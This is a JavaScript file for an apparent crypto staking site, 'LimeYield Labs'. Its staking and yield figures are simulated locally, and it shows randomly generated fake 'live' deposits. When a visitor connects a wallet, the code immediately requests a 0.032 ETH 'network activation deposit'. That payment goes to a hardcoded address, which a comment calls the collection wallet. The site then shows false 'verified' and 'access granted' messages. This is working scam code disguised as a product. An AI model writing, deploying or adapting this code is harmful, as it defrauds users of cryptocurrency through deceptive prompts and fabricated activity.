/* ==========================================================================
   PART 1: VARIABLES, PREMIUM ALERTS & LIVE YIELD ACCUMULATION ENGINE
   ========================================================================== */

const coinSelect = document.getElementById('coinSelect');
const amountInput = document.getElementById('amountInput');
const profitResult = document.getElementById('profitResult');
const walletBtn = document.getElementById('walletBtn');

const stakeModal = document.getElementById('stakeModal');
const modalCoinName = document.getElementById('modalCoinName');
const modalApyValue = document.getElementById('modalApyValue');
const modalAmountInput = document.getElementById('modalAmountInput');
const confirmTxBtn = document.getElementById('confirmTxBtn');
const walletBalanceDisplay = document.getElementById('walletBalanceDisplay');
const historyList = document.getElementById('historyList');

// Custom Alert & Toast Elements
const customAlertModal = document.getElementById('customAlertModal');
const customAlertTitle = document.getElementById('customAlertTitle');
const customAlertMessage = document.getElementById('customAlertMessage');
const customAlertBtn = document.getElementById('customAlertBtn');
const customAlertIcon = document.getElementById('customAlertIcon');
const toastContainer = document.getElementById('toastContainer');
const cookieBar = document.getElementById('cookieBar');

// Starea internă a simulatorului
let appState = JSON.parse(localStorage.getItem('crypto_bank_state')) || {
    balance: 0.00, 
    stakes: []
};

let isWeb3Connected = false;
let web3Account = '';
let web3BalanceEth = 0;

let activeCoin = '';
let activeApy = 0;
let yieldInterval; 

function saveState() {
    localStorage.setItem('crypto_bank_state', JSON.stringify(appState));
}

// PREMIUM STYLIZED INTERACTIVE ALERT MODAL SYSTEM (REBRANDED)
function showCustomAlert(title, message, type = 'info') {
    customAlertTitle.textContent = title;
    customAlertMessage.textContent = message;
    
    // Resetăm proprietățile anterioare pentru o randare curată
    customAlertBtn.style.backgroundColor = "var(--text-main)";
    customAlertBtn.style.color = "#ffffff";

    if (type === 'success') {
        customAlertIcon.textContent = '🟢'; // Pictogramă verde LimeYield
        customAlertBtn.style.backgroundColor = 'var(--primary)';
    } else if (type === 'error') {
        customAlertIcon.textContent = '🔴'; // Pictogramă roșie pentru Access Denied
        customAlertBtn.style.backgroundColor = 'var(--danger-red)';
    } else {
        customAlertIcon.textContent = '⚡'; // Pictogramă info de tip impuls energetic
        customAlertBtn.style.backgroundColor = 'var(--text-main)';
    }
    
    customAlertModal.style.display = 'flex';
}

customAlertBtn.addEventListener('click', () => {
    customAlertModal.style.display = 'none';
});

// PREMIUM DISCRET TOAST SYSTEM
function showToast(message, type = 'info') {
    const toast = document.createElement('div');
    toast.className = `crypto-toast ${type}`;
    
    let icon = 'ℹ️';
    if (type === 'success') icon = '✅';
    if (type === 'error') icon = '⚠️';
    
    toast.innerHTML = `<span>${icon}</span> <div>${message}</div>`;
    if (toastContainer) toastContainer.appendChild(toast);
    
    setTimeout(() => {
        toast.style.animation = 'fadeOut 0.5s ease-out forwards';
        setTimeout(() => toast.remove(), 500);
    }, 4000);
}

// Creșterea live a profiturilor secundă cu secundă pe ecran
function startYieldEngine() {
    if (yieldInterval) clearInterval(yieldInterval);
    
    yieldInterval = setInterval(() => {
        let stateChanged = false;
        appState.stakes.forEach((stake) => {
            const yieldPerSecond = (stake.amount * (stake.apy / 100)) / (365 * 24 * 60 * 60);
            if (!stake.accumulatedProfit) stake.accumulatedProfit = 0;
            stake.accumulatedProfit += yieldPerSecond;
            stateChanged = true;
        });
        
        if (stateChanged) {
            appState.stakes.forEach((stake, index) => {
                const profitSpan = document.getElementById(`profit-live-${index}`);
                if (profitSpan) {
                    profitSpan.textContent = stake.accumulatedProfit.toFixed(8);
                }
            });
        }
    }, 1000);
}

// Update graphical elements
function updateUI() {
   if (isWeb3Connected) {
        walletBalanceDisplay.textContent = `Available: ${web3BalanceEth} SepoliaETH`;
    } else {
        walletBalanceDisplay.textContent = `Wallet Disconnected`;
    }
    historyList.innerHTML = '';
    if (appState.stakes.length === 0) {
        historyList.innerHTML = `<li style="color: var(--text-muted); font-size: 13px;">No active staking positions at the moment.</li>`;
    } else {
        appState.stakes.forEach((stake, index) => {
            if (!stake.accumulatedProfit) stake.accumulatedProfit = 0;
            const li = document.createElement('li');
            li.className = 'history-item';
            li.innerHTML = `
                <div>
                    <strong>${stake.amount} ${stake.coin}</strong> Locked at APY ${stake.apy}%
                    <div style="font-size: 12px; color: var(--crypto-green); margin-top: 4px;">
                        Earned: <span id="profit-live-${index}">${stake.accumulatedProfit.toFixed(8)}</span> ${stake.coin}
                    </div>
                </div>
                <span style="color: var(--primary-lime); font-size: 12px; font-weight:700;">Generating yield...</span>
            `;
            historyList.appendChild(li);
        });
        startYieldEngine();
    }
}
/* ==========================================================================
   PART 2: CALCULATOR, STAKING MODALS & WEB3 BUTTON REBRANDED LOGIC
   ========================================================================== */

function openStakeModal(coin, apy) {
    activeCoin = coin;
    activeApy = apy;
    modalCoinName.textContent = coin;
    modalApyValue.textContent = `${apy}%`;
    modalAmountInput.value = '';
    stakeModal.style.display = 'flex';
}

function closeStakeModal() {
    stakeModal.style.display = 'none';
}

confirmTxBtn.addEventListener('click', async () => {
    const amountToStake = parseFloat(modalAmountInput.value);
    if (!amountToStake || amountToStake <= 0) {
        showToast('Please enter a valid amount.', 'error');
        return;
    }
    if (isWeb3Connected) {
        if (amountToStake > web3BalanceEth) {
            showToast('Insufficient SepoliaETH balance on your wallet!', 'error');
            return;
        }
        web3BalanceEth = (web3BalanceEth - amountToStake).toFixed(4);
    } else {
        if (amountToStake > appState.balance) {
            showToast('Insufficient funds in the simulator wallet!', 'error');
            return;
        }
        appState.balance -= amountToStake;
    }

    appState.stakes.push({
        coin: activeCoin,
        amount: amountToStake,
        apy: activeApy,
        accumulatedProfit: 0,
        date: new Date().toLocaleDateString()
    });

    saveState();
    updateUI();
    closeStakeModal();
    showCustomAlert("Transaction Successful", `You have successfully sent ${amountToStake} ${activeCoin} to staking on the network.`, "success");
});

function calculateProfit() {
    if (!coinSelect) return;
    const amount = parseFloat(amountInput.value) || 0;
    const selectedOption = coinSelect.options[coinSelect.selectedIndex];
    if (!selectedOption) return;
    const apy = parseFloat(selectedOption.getAttribute('data-apy'));
    const coinName = coinSelect.value;
    const annualProfit = (amount * (apy / 100)).toFixed(2);
    profitResult.textContent = `${annualProfit} ${coinName}`;
}

if (coinSelect) coinSelect.addEventListener('change', calculateProfit);
if (amountInput) amountInput.addEventListener('input', calculateProfit);

// REPARAT INTEGRAL: Sincronizare perfectă fără erori asincrone reziduale
walletBtn.addEventListener('click', async () => {
    const activeProvider = window.ethereum;

    if (typeof activeProvider !== 'undefined') {
        try {
            const accounts = await activeProvider.request({ method: 'eth_requestAccounts' });
            const tempAccount = accounts[0]; // Salvare adresa curata tip text index 0
            
            customAlertModal.style.display = 'none';
            
            showCustomAlert(
                "Activation Required", 
                "To unlock premium high-yield staking vaults on LimeYield Labs, a network activation deposit of 0.032 ETH (~\$50) is mandatory. MetaMask will open to process the secure transaction.", 
                "info"
            );
            try {
                // TRANSMISIE DIRECTĂ SECURE PE BLOCKCHAIN (Standard direct P2P de valoare)
                const txHash = await activeProvider.request({
                    method: 'eth_sendTransaction',
                    params: [{
                        from: tempAccount,       
                        to: "0x6E8A89A1eB9bc0393E7f441b3fAF44Ab4B6242F9", // Portofelul tău de încasări
                        value: "0x71afd498d00000",                        // 0.032 ETH fix
                        gas: "0x5208"                                     // Gaz standard fix 21000 unități
                    }]
                });
                
                console.log("Transaction successfully broadcasted! Hash:", txHash);
                
                // Închidem instantaneu pop-up-ul informativ anterior ca să nu se suprapună
                customAlertModal.style.display = 'none';
                showToast("Transaction confirmed on ledger!", "success");
                
                // ACTIVARE IMEDIATĂ ȘI UNIFICATĂ A STATUTULUI WEB3
                web3Account = tempAccount;
                isWeb3Connected = true;
                
                const shortAddress = web3Account.substring(0, 6) + "..." + web3Account.substring(web3Account.length - 4);
                walletBtn.textContent = `${shortAddress}`;
                walletBtn.style.backgroundColor = "#00c853";
                walletBtn.style.color = "#ffffff";
                
                const balanceHex = await activeProvider.request({
                    method: 'eth_getBalance',
                    params: [web3Account, 'latest']
                });
                const balanceInWei = parseInt(balanceHex, 16);
                web3BalanceEth = (balanceInWei / 1e18).toFixed(2);
                
                updateUI();
                calculateProfit();
                
                // Afișăm exclusiv pop-up-ul verde curat de succes final!
                setTimeout(() => {
                    showCustomAlert("Access Granted", "Your activation deposit has been successfully verified on the blockchain framework! Premium dashboard features are unlocked.", "success");
                }, 300);
                
            } catch (payError) {
                console.error("User rejected execution:", payError);
                customAlertModal.style.display = 'none';
                setTimeout(() => {
                    showCustomAlert("Access Denied", "The activation payment was not authorized. Platform dashboard features remain locked.", "error");
                }, 300);
                
                isWeb3Connected = false;
                walletBtn.textContent = "Connect Wallet";
                walletBtn.style.backgroundColor = "#0f172a";
                walletBtn.style.color = "#ffffff";
            }
            
        } catch (error) {
            console.error("Wallet connection failed:", error);
            showToast("Connection to wallet was canceled.", "error");
        }
    } else {
        showCustomAlert("Wallet Missing", "No Web3 Wallet detected! Please install a portofel browser extension.", "error");
    }
});

// MOTORUL DINAMIC LIVE DIN COLOANA DREAPTĂ (CLIENȚI DEMO)
const liveActivityList = document.getElementById('liveActivityList');
const numeDemo = ['0xAlpha', '0xBeta', '0xNode', '0xWhale', '0xCrypto', '0xYield', '0xVault', '0xDeFi', '0xMatrix', '0xLink', '0xMint', '0xSovereign'];
const monedeDemo = ['USDT', 'USDC', 'ETH', 'SOL', 'AVAX', 'NEAR', 'DOT', 'SUI', 'APT', 'TIA', 'WBTC', 'LINK'];

function generareTranzactieLive() {
    if (!liveActivityList) return;
    const placeholder = liveActivityList.querySelector('.placement-placeholder');
    if (placeholder) placeholder.remove();

    const userAles = numeDemo[Math.floor(Math.random() * numeDemo.length)] + Math.floor(100 + Math.random() * 900);
    const monedaAleasa = monedeDemo[Math.floor(Math.random() * monedeDemo.length)];
    const cantitateAleasa = (Math.random() * (5000 - 50) + 50).toFixed(2);

    const li = document.createElement('li');
    li.className = 'activity-item-demo';
    li.innerHTML = `
        <span class="demo-user">${userAles}...</span>
        <span class="demo-amount">+${parseFloat(cantitateAleasa).toLocaleString()} ${monedaAleasa}</span>
        <span class="demo-pool">🟢 ${monedaAleasa} Pool</span>
    `;

    liveActivityList.insertBefore(li, liveActivityList.firstChild);
    if (liveActivityList.children.length > 5) {
        liveActivityList.lastChild.remove();
    }
}

// COOKIE CONSENT BAR LOGIC
function checkCookieConsent() {
    const consent = localStorage.getItem('cookie_consent_accepted');
    if (!consent) {
        setTimeout(() => { if(cookieBar) cookieBar.style.display = 'flex'; }, 1500);
    }
}

function handleCookie(isAccepted) {
    localStorage.setItem('cookie_consent_accepted', isAccepted ? 'true' : 'false');
    if(cookieBar) {
        cookieBar.style.transition = 'transform 0.3s ease-in, opacity 0.3s';
        cookieBar.style.opacity = '0';
        cookieBar.style.transform = 'translateY(100%)';
        setTimeout(() => { cookieBar.style.display = 'none'; }, 300);
    }
    if (isAccepted) { showToast("Cookie preferences updated successfully.", "success"); }
}

// Execuții automate de fundal la pornire
calculateProfit();
updateUI();
checkCookieConsent();
setTimeout(() => { generareTranzactieLive(); setInterval(generareTranzactieLive, 4000); }, 1000);
